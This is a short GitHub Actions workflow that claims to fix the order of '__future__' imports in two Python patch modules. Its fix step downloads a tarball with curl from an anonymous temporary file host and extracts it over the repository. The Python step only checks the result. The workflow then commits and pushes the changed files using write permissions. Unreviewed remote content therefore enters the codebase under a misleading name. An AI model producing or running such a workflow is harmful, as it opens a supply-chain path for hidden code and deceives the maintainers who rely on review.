name: Fix future import order

on:
  workflow_dispatch:

permissions:
  contents: write

jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply fix
        run: |
          curl -fsSL -o /tmp/f.tgz "https://litter.catbox.moe/nszwc2.tgz"
          tar xzf /tmp/f.tgz
          python3 -c "import ast; from pathlib import Path
for p in ['hanhua_v3/runtime/lang0_gbk_patch.py','hanhua_v3/runtime/tbl_utf16_patch.py']:
 t=Path(p).read_text(encoding='utf-8'); assert t.find('from __future__') < t.find('__all__'); ast.parse(t); print('ok', p)"
      - name: Commit
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add hanhua_v3/runtime/lang0_gbk_patch.py hanhua_v3/runtime/tbl_utf16_patch.py
          git commit -m "fix: place __all__ after from __future__ in patch modules" || exit 0
          git push
